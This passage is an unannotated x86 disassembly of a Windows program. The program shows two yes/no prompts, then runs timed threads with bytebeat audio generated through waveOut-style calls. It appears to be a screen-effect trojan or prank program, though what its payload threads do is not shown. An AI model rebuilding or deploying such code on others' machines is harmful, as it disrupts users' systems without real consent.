  405058:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40505f:	00 
  405060:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405067:	00 
  405068:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40506f:	00 
  405070:	8d 45 de             	lea    -0x22(%ebp),%eax
  405073:	89 44 24 08          	mov    %eax,0x8(%esp)
  405077:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  40507e:	ff 
  40507f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405082:	89 04 24             	mov    %eax,(%esp)
  405085:	a1 10 a3 40 00       	mov    0x40a310,%eax
  40508a:	ff d0                	call   *%eax
  40508c:	83 ec 18             	sub    $0x18,%esp
  40508f:	c7 85 de 59 f1 ff 00 	movl   $0x0,-0xea622(%ebp)
  405096:	00 00 00 
  405099:	8d 85 e2 59 f1 ff    	lea    -0xea61e(%ebp),%eax
  40509f:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  4050a4:	89 54 24 08          	mov    %edx,0x8(%esp)
  4050a8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4050af:	00 
  4050b0:	89 04 24             	mov    %eax,(%esp)
  4050b3:	e8 90 1d 00 00       	call   0x406e48
  4050b8:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4050bf:	81 7d f4 ff a5 0e 00 	cmpl   $0xea5ff,-0xc(%ebp)
  4050c6:	77 4e                	ja     0x405116
  4050c8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050cb:	0f af c0             	imul   %eax,%eax
  4050ce:	c1 e8 0d             	shr    $0xd,%eax
  4050d1:	89 c2                	mov    %eax,%edx
  4050d3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050d6:	83 c0 1b             	add    $0x1b,%eax
  4050d9:	21 d0                	and    %edx,%eax
  4050db:	ba 37 13 37 13       	mov    $0x13371337,%edx
  4050e0:	89 c1                	mov    %eax,%ecx
  4050e2:	d3 fa                	sar    %cl,%edx
  4050e4:	89 d0                	mov    %edx,%eax
  4050e6:	83 e0 7f             	and    $0x7f,%eax
  4050e9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4050ec:	0f af c2             	imul   %edx,%eax
  4050ef:	89 c2                	mov    %eax,%edx
  4050f1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050f4:	c1 e8 03             	shr    $0x3,%eax
  4050f7:	09 c2                	or     %eax,%edx
  4050f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4050fc:	c1 e0 05             	shl    $0x5,%eax
  4050ff:	09 d0                	or     %edx,%eax
  405101:	89 c1                	mov    %eax,%ecx
  405103:	8d 95 de 59 f1 ff    	lea    -0xea622(%ebp),%edx
  405109:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40510c:	01 d0                	add    %edx,%eax
  40510e:	88 08                	mov    %cl,(%eax)
  405110:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  405114:	eb a9                	jmp    0x4050bf
  405116:	8d 85 be 59 f1 ff    	lea    -0xea642(%ebp),%eax
  40511c:	b9 20 00 00 00       	mov    $0x20,%ecx
  405121:	bb 00 00 00 00       	mov    $0x0,%ebx
  405126:	89 18                	mov    %ebx,(%eax)
  405128:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  40512c:	8d 50 04             	lea    0x4(%eax),%edx
  40512f:	83 e2 fc             	and    $0xfffffffc,%edx
  405132:	29 d0                	sub    %edx,%eax
  405134:	01 c1                	add    %eax,%ecx
  405136:	83 e1 fc             	and    $0xfffffffc,%ecx
  405139:	83 e1 fc             	and    $0xfffffffc,%ecx
  40513c:	b8 00 00 00 00       	mov    $0x0,%eax
  405141:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  405144:	83 c0 04             	add    $0x4,%eax
  405147:	39 c8                	cmp    %ecx,%eax
  405149:	72 f6                	jb     0x405141
  40514b:	01 c2                	add    %eax,%edx
  40514d:	c7 85 c2 59 f1 ff 00 	movl   $0xea600,-0xea63e(%ebp)
  405154:	a6 0e 00 
  405157:	8d 85 de 59 f1 ff    	lea    -0xea622(%ebp),%eax
  40515d:	89 85 be 59 f1 ff    	mov    %eax,-0xea642(%ebp)
  405163:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405166:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40516d:	00 
  40516e:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  405174:	89 54 24 04          	mov    %edx,0x4(%esp)
  405178:	89 04 24             	mov    %eax,(%esp)
  40517b:	a1 14 a3 40 00       	mov    0x40a314,%eax
  405180:	ff d0                	call   *%eax
  405182:	83 ec 0c             	sub    $0xc,%esp
  405185:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405188:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40518f:	00 
  405190:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  405196:	89 54 24 04          	mov    %edx,0x4(%esp)
  40519a:	89 04 24             	mov    %eax,(%esp)
  40519d:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  4051a2:	ff d0                	call   *%eax
  4051a4:	83 ec 0c             	sub    $0xc,%esp
  4051a7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4051aa:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  4051b1:	00 
  4051b2:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  4051b8:	89 54 24 04          	mov    %edx,0x4(%esp)
  4051bc:	89 04 24             	mov    %eax,(%esp)
  4051bf:	a1 18 a3 40 00       	mov    0x40a318,%eax
  4051c4:	ff d0                	call   *%eax
  4051c6:	83 ec 0c             	sub    $0xc,%esp
  4051c9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4051cc:	89 04 24             	mov    %eax,(%esp)
  4051cf:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  4051d4:	ff d0                	call   *%eax
  4051d6:	83 ec 04             	sub    $0x4,%esp
  4051d9:	90                   	nop
  4051da:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4051dd:	c9                   	leave
  4051de:	c3                   	ret
  4051df:	55                   	push   %ebp
  4051e0:	89 e5                	mov    %esp,%ebp
  4051e2:	53                   	push   %ebx
  4051e3:	b8 64 a6 0e 00       	mov    $0xea664,%eax
  4051e8:	e8 e3 19 00 00       	call   0x406bd0
  4051ed:	29 c4                	sub    %eax,%esp
  4051ef:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4051f6:	66 c7 45 de 01 00    	movw   $0x1,-0x22(%ebp)
  4051fc:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  405202:	c7 45 e2 00 7d 00 00 	movl   $0x7d00,-0x1e(%ebp)
  405209:	c7 45 e6 00 7d 00 00 	movl   $0x7d00,-0x1a(%ebp)
  405210:	66 c7 45 ea 01 00    	movw   $0x1,-0x16(%ebp)
  405216:	66 c7 45 ec 08 00    	movw   $0x8,-0x14(%ebp)
  40521c:	66 c7 45 ee 00 00    	movw   $0x0,-0x12(%ebp)
  405222:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405229:	00 
  40522a:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405231:	00 
  405232:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405239:	00 
  40523a:	8d 45 de             	lea    -0x22(%ebp),%eax
  40523d:	89 44 24 08          	mov    %eax,0x8(%esp)
  405241:	c7 44 24 04 ff ff ff 	movl   $0xffffffff,0x4(%esp)
  405248:	ff 
  405249:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40524c:	89 04 24             	mov    %eax,(%esp)
  40524f:	a1 10 a3 40 00       	mov    0x40a310,%eax
  405254:	ff d0                	call   *%eax
  405256:	83 ec 18             	sub    $0x18,%esp
  405259:	c7 85 de 59 f1 ff 00 	movl   $0x0,-0xea622(%ebp)
  405260:	00 00 00 
  405263:	8d 85 e2 59 f1 ff    	lea    -0xea61e(%ebp),%eax
  405269:	ba fc a5 0e 00       	mov    $0xea5fc,%edx
  40526e:	89 54 24 08          	mov    %edx,0x8(%esp)
  405272:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405279:	00 
  40527a:	89 04 24             	mov    %eax,(%esp)
  40527d:	e8 c6 1b 00 00       	call   0x406e48
  405282:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  405289:	81 7d f4 ff a5 0e 00 	cmpl   $0xea5ff,-0xc(%ebp)
  405290:	77 7f                	ja     0x405311
  405292:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405295:	25 00 10 00 00       	and    $0x1000,%eax
  40529a:	85 c0                	test   %eax,%eax
  40529c:	74 1c                	je     0x4052ba
  40529e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052a1:	0f b7 c0             	movzwl %ax,%eax
  4052a4:	3d ff e7 00 00       	cmp    $0xe7ff,%eax
  4052a9:	76 08                	jbe    0x4052b3
  4052ab:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052ae:	83 e0 07             	and    $0x7,%eax
  4052b1:	eb 0c                	jmp    0x4052bf
  4052b3:	b8 07 00 00 00       	mov    $0x7,%eax
  4052b8:	eb 05                	jmp    0x4052bf
  4052ba:	b8 10 00 00 00       	mov    $0x10,%eax
  4052bf:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4052c2:	c1 ea 0e             	shr    $0xe,%edx
  4052c5:	83 e2 01             	and    $0x1,%edx
  4052c8:	01 d0                	add    %edx,%eax
  4052ca:	0f af 45 f4          	imul   -0xc(%ebp),%eax
  4052ce:	89 c2                	mov    %eax,%edx
  4052d0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052d3:	0f af c0             	imul   %eax,%eax
  4052d6:	25 00 08 00 00       	and    $0x800,%eax
  4052db:	85 c0                	test   %eax,%eax
  4052dd:	74 07                	je     0x4052e6
  4052df:	b9 02 00 00 00       	mov    $0x2,%ecx
  4052e4:	eb 05                	jmp    0x4052eb
  4052e6:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4052eb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4052ee:	d3 e8                	shr    %cl,%eax
  4052f0:	83 e0 03             	and    $0x3,%eax
  4052f3:	89 c1                	mov    %eax,%ecx
  4052f5:	d3 ea                	shr    %cl,%edx
  4052f7:	89 d0                	mov    %edx,%eax
  4052f9:	89 c1                	mov    %eax,%ecx
  4052fb:	8d 95 de 59 f1 ff    	lea    -0xea622(%ebp),%edx
  405301:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405304:	01 d0                	add    %edx,%eax
  405306:	88 08                	mov    %cl,(%eax)
  405308:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  40530c:	e9 78 ff ff ff       	jmp    0x405289
  405311:	8d 85 be 59 f1 ff    	lea    -0xea642(%ebp),%eax
  405317:	b9 20 00 00 00       	mov    $0x20,%ecx
  40531c:	bb 00 00 00 00       	mov    $0x0,%ebx
  405321:	89 18                	mov    %ebx,(%eax)
  405323:	89 5c 08 fc          	mov    %ebx,-0x4(%eax,%ecx,1)
  405327:	8d 50 04             	lea    0x4(%eax),%edx
  40532a:	83 e2 fc             	and    $0xfffffffc,%edx
  40532d:	29 d0                	sub    %edx,%eax
  40532f:	01 c1                	add    %eax,%ecx
  405331:	83 e1 fc             	and    $0xfffffffc,%ecx
  405334:	83 e1 fc             	and    $0xfffffffc,%ecx
  405337:	b8 00 00 00 00       	mov    $0x0,%eax
  40533c:	89 1c 02             	mov    %ebx,(%edx,%eax,1)
  40533f:	83 c0 04             	add    $0x4,%eax
  405342:	39 c8                	cmp    %ecx,%eax
  405344:	72 f6                	jb     0x40533c
  405346:	01 c2                	add    %eax,%edx
  405348:	c7 85 c2 59 f1 ff 00 	movl   $0xea600,-0xea63e(%ebp)
  40534f:	a6 0e 00 
  405352:	8d 85 de 59 f1 ff    	lea    -0xea622(%ebp),%eax
  405358:	89 85 be 59 f1 ff    	mov    %eax,-0xea642(%ebp)
  40535e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405361:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  405368:	00 
  405369:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  40536f:	89 54 24 04          	mov    %edx,0x4(%esp)
  405373:	89 04 24             	mov    %eax,(%esp)
  405376:	a1 14 a3 40 00       	mov    0x40a314,%eax
  40537b:	ff d0                	call   *%eax
  40537d:	83 ec 0c             	sub    $0xc,%esp
  405380:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405383:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  40538a:	00 
  40538b:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  405391:	89 54 24 04          	mov    %edx,0x4(%esp)
  405395:	89 04 24             	mov    %eax,(%esp)
  405398:	a1 1c a3 40 00       	mov    0x40a31c,%eax
  40539d:	ff d0                	call   *%eax
  40539f:	83 ec 0c             	sub    $0xc,%esp
  4053a2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4053a5:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
  4053ac:	00 
  4053ad:	8d 95 be 59 f1 ff    	lea    -0xea642(%ebp),%edx
  4053b3:	89 54 24 04          	mov    %edx,0x4(%esp)
  4053b7:	89 04 24             	mov    %eax,(%esp)
  4053ba:	a1 18 a3 40 00       	mov    0x40a318,%eax
  4053bf:	ff d0                	call   *%eax
  4053c1:	83 ec 0c             	sub    $0xc,%esp
  4053c4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4053c7:	89 04 24             	mov    %eax,(%esp)
  4053ca:	a1 0c a3 40 00       	mov    0x40a30c,%eax
  4053cf:	ff d0                	call   *%eax
  4053d1:	83 ec 04             	sub    $0x4,%esp
  4053d4:	90                   	nop
  4053d5:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4053d8:	c9                   	leave
  4053d9:	c3                   	ret
  4053da:	55                   	push   %ebp
  4053db:	89 e5                	mov    %esp,%ebp
  4053dd:	83 ec 68             	sub    $0x68,%esp
  4053e0:	c7 44 24 0c 34 00 00 	movl   $0x34,0xc(%esp)
  4053e7:	00 
  4053e8:	c7 44 24 08 44 80 40 	movl   $0x408044,0x8(%esp)
  4053ef:	00 
  4053f0:	c7 44 24 04 60 80 40 	movl   $0x408060,0x4(%esp)
  4053f7:	00 
  4053f8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4053ff:	a1 00 a3 40 00       	mov    0x40a300,%eax
  405404:	ff d0                	call   *%eax
  405406:	83 ec 10             	sub    $0x10,%esp
  405409:	83 f8 07             	cmp    $0x7,%eax
  40540c:	0f 94 c0             	sete   %al
  40540f:	84 c0                	test   %al,%al
  405411:	74 0e                	je     0x405421
  405413:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40541a:	a1 20 a2 40 00       	mov    0x40a220,%eax
  40541f:	ff d0                	call   *%eax
  405421:	c7 44 24 0c 34 00 00 	movl   $0x34,0xc(%esp)
  405428:	00 
  405429:	c7 44 24 08 c0 80 40 	movl   $0x4080c0,0x8(%esp)
  405430:	00 
  405431:	c7 44 24 04 fc 80 40 	movl   $0x4080fc,0x4(%esp)
  405438:	00 
  405439:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405440:	a1 00 a3 40 00       	mov    0x40a300,%eax
  405445:	ff d0                	call   *%eax
  405447:	83 ec 10             	sub    $0x10,%esp
  40544a:	83 f8 07             	cmp    $0x7,%eax
  40544d:	0f 94 c0             	sete   %al
  405450:	84 c0                	test   %al,%al
  405452:	74 0e                	je     0x405462
  405454:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40545b:	a1 20 a2 40 00       	mov    0x40a220,%eax
  405460:	ff d0                	call   *%eax
  405462:	e8 e4 c6 ff ff       	call   0x401b4b
  405467:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40546e:	00 
  40546f:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405476:	00 
  405477:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40547e:	00 
  40547f:	c7 44 24 08 fd 1b 40 	movl   $0x401bfd,0x8(%esp)
  405486:	00 
  405487:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40548e:	00 
  40548f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405496:	a1 14 a2 40 00       	mov    0x40a214,%eax
  40549b:	ff d0                	call   *%eax
  40549d:	83 ec 18             	sub    $0x18,%esp
  4054a0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4054a3:	e8 18 ec ff ff       	call   0x4040c0
  4054a8:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  4054af:	a1 50 a2 40 00       	mov    0x40a250,%eax
  4054b4:	ff d0                	call   *%eax
  4054b6:	83 ec 04             	sub    $0x4,%esp
  4054b9:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4054c0:	00 
  4054c1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4054c4:	89 04 24             	mov    %eax,(%esp)
  4054c7:	a1 58 a2 40 00       	mov    0x40a258,%eax
  4054cc:	ff d0                	call   *%eax
  4054ce:	83 ec 08             	sub    $0x8,%esp
  4054d1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4054d4:	89 04 24             	mov    %eax,(%esp)
  4054d7:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  4054dc:	ff d0                	call   *%eax
  4054de:	83 ec 04             	sub    $0x4,%esp
  4054e1:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4054e8:	00 
  4054e9:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4054f0:	00 
  4054f1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4054f8:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  4054fd:	ff d0                	call   *%eax
  4054ff:	83 ec 0c             	sub    $0xc,%esp
  405502:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405509:	00 
  40550a:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405511:	00 
  405512:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405519:	00 
  40551a:	c7 44 24 08 21 20 40 	movl   $0x402021,0x8(%esp)
  405521:	00 
  405522:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405529:	00 
  40552a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405531:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405536:	ff d0                	call   *%eax
  405538:	83 ec 18             	sub    $0x18,%esp
  40553b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40553e:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405545:	00 
  405546:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40554d:	00 
  40554e:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405555:	00 
  405556:	c7 44 24 08 32 24 40 	movl   $0x402432,0x8(%esp)
  40555d:	00 
  40555e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405565:	00 
  405566:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40556d:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405572:	ff d0                	call   *%eax
  405574:	83 ec 18             	sub    $0x18,%esp
  405577:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40557a:	e8 4c ed ff ff       	call   0x4042cb
  40557f:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  405586:	a1 50 a2 40 00       	mov    0x40a250,%eax
  40558b:	ff d0                	call   *%eax
  40558d:	83 ec 04             	sub    $0x4,%esp
  405590:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405597:	00 
  405598:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40559b:	89 04 24             	mov    %eax,(%esp)
  40559e:	a1 58 a2 40 00       	mov    0x40a258,%eax
  4055a3:	ff d0                	call   *%eax
  4055a5:	83 ec 08             	sub    $0x8,%esp
  4055a8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4055af:	00 
  4055b0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4055b3:	89 04 24             	mov    %eax,(%esp)
  4055b6:	a1 58 a2 40 00       	mov    0x40a258,%eax
  4055bb:	ff d0                	call   *%eax
  4055bd:	83 ec 08             	sub    $0x8,%esp
  4055c0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4055c3:	89 04 24             	mov    %eax,(%esp)
  4055c6:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  4055cb:	ff d0                	call   *%eax
  4055cd:	83 ec 04             	sub    $0x4,%esp
  4055d0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4055d3:	89 04 24             	mov    %eax,(%esp)
  4055d6:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  4055db:	ff d0                	call   *%eax
  4055dd:	83 ec 04             	sub    $0x4,%esp
  4055e0:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4055e7:	00 
  4055e8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4055ef:	00 
  4055f0:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4055f7:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  4055fc:	ff d0                	call   *%eax
  4055fe:	83 ec 0c             	sub    $0xc,%esp
  405601:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  405608:	00 
  405609:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405610:	00 
  405611:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  405618:	00 
  405619:	c7 44 24 08 82 25 40 	movl   $0x402582,0x8(%esp)
  405620:	00 
  405621:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405628:	00 
  405629:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405630:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405635:	ff d0                	call   *%eax
  405637:	83 ec 18             	sub    $0x18,%esp
  40563a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40563d:	e8 5e ee ff ff       	call   0x4044a0
  405642:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  405649:	a1 50 a2 40 00       	mov    0x40a250,%eax
  40564e:	ff d0                	call   *%eax
  405650:	83 ec 04             	sub    $0x4,%esp
  405653:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40565a:	00 
  40565b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40565e:	89 04 24             	mov    %eax,(%esp)
  405661:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405666:	ff d0                	call   *%eax
  405668:	83 ec 08             	sub    $0x8,%esp
  40566b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40566e:	89 04 24             	mov    %eax,(%esp)
  405671:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405676:	ff d0                	call   *%eax
  405678:	83 ec 04             	sub    $0x4,%esp
  40567b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405682:	00 
  405683:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40568a:	00 
  40568b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405692:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405697:	ff d0                	call   *%eax
  405699:	83 ec 0c             	sub    $0xc,%esp
  40569c:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4056a3:	00 
  4056a4:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4056ab:	00 
  4056ac:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4056b3:	00 
  4056b4:	c7 44 24 08 9d 29 40 	movl   $0x40299d,0x8(%esp)
  4056bb:	00 
  4056bc:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4056c3:	00 
  4056c4:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4056cb:	a1 14 a2 40 00       	mov    0x40a214,%eax
  4056d0:	ff d0                	call   *%eax
  4056d2:	83 ec 18             	sub    $0x18,%esp
  4056d5:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4056d8:	e8 d6 ef ff ff       	call   0x4046b3
  4056dd:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  4056e4:	a1 50 a2 40 00       	mov    0x40a250,%eax
  4056e9:	ff d0                	call   *%eax
  4056eb:	83 ec 04             	sub    $0x4,%esp
  4056ee:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4056f5:	00 
  4056f6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4056f9:	89 04 24             	mov    %eax,(%esp)
  4056fc:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405701:	ff d0                	call   *%eax
  405703:	83 ec 08             	sub    $0x8,%esp
  405706:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405709:	89 04 24             	mov    %eax,(%esp)
  40570c:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405711:	ff d0                	call   *%eax
  405713:	83 ec 04             	sub    $0x4,%esp
  405716:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40571d:	00 
  40571e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405725:	00 
  405726:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40572d:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  405732:	ff d0                	call   *%eax
  405734:	83 ec 0c             	sub    $0xc,%esp
  405737:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40573e:	00 
  40573f:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  405746:	00 
  405747:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  40574e:	00 
  40574f:	c7 44 24 08 15 2c 40 	movl   $0x402c15,0x8(%esp)
  405756:	00 
  405757:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40575e:	00 
  40575f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405766:	a1 14 a2 40 00       	mov    0x40a214,%eax
  40576b:	ff d0                	call   *%eax
  40576d:	83 ec 18             	sub    $0x18,%esp
  405770:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405773:	e8 3c f1 ff ff       	call   0x4048b4
  405778:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  40577f:	a1 50 a2 40 00       	mov    0x40a250,%eax
  405784:	ff d0                	call   *%eax
  405786:	83 ec 04             	sub    $0x4,%esp
  405789:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  405790:	00 
  405791:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405794:	89 04 24             	mov    %eax,(%esp)
  405797:	a1 58 a2 40 00       	mov    0x40a258,%eax
  40579c:	ff d0                	call   *%eax
  40579e:	83 ec 08             	sub    $0x8,%esp
  4057a1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4057a4:	89 04 24             	mov    %eax,(%esp)
  4057a7:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  4057ac:	ff d0                	call   *%eax
  4057ae:	83 ec 04             	sub    $0x4,%esp
  4057b1:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4057b8:	00 
  4057b9:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4057c0:	00 
  4057c1:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4057c8:	a1 fc a2 40 00       	mov    0x40a2fc,%eax
  4057cd:	ff d0                	call   *%eax
  4057cf:	83 ec 0c             	sub    $0xc,%esp
  4057d2:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4057d9:	00 
  4057da:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4057e1:	00 
  4057e2:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4057e9:	00 
  4057ea:	c7 44 24 08 8d 2e 40 	movl   $0x402e8d,0x8(%esp)
  4057f1:	00 
  4057f2:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4057f9:	00 
  4057fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  405801:	a1 14 a2 40 00       	mov    0x40a214,%eax
  405806:	ff d0                	call   *%eax
  405808:	83 ec 18             	sub    $0x18,%esp
  40580b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40580e:	e8 6d f2 ff ff       	call   0x404a80
  405813:	c7 04 24 30 75 00 00 	movl   $0x7530,(%esp)
  40581a:	a1 50 a2 40 00       	mov    0x40a250,%eax
  40581f:	ff d0                	call   *%eax
  405821:	83 ec 04             	sub    $0x4,%esp
  405824:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40582b:	00 
  40582c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40582f:	89 04 24             	mov    %eax,(%esp)
  405832:	a1 58 a2 40 00       	mov    0x40a258,%eax
  405837:	ff d0                	call   *%eax
  405839:	83 ec 08             	sub    $0x8,%esp
  40583c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40583f:	89 04 24             	mov    %eax,(%esp)
  405842:	a1 0c a2 40 00       	mov    0x40a20c,%eax
  405847:	ff d0                	call   *%eax
  405849:	83 ec 04             	sub    $0x4,%esp
  40584c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  405853:	00 
